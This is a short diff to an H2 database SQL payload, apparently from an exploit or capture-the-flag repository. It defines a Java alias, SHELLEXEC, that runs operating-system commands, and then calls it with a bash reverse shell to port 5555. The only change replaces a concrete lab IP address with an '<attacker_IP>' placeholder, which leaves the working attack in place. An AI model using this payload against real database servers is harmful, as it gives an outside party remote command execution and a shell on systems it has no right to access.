@@ -4,4 +4,4 @@ CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOExcep
 java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
 	return s.hasNext() ? s.next() : ""; }
 $$;
-CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.16.65/5555 0>&1')
+CALL SHELLEXEC('bash -i >& /dev/tcp/<attacker_IP>/5555 0>&1')
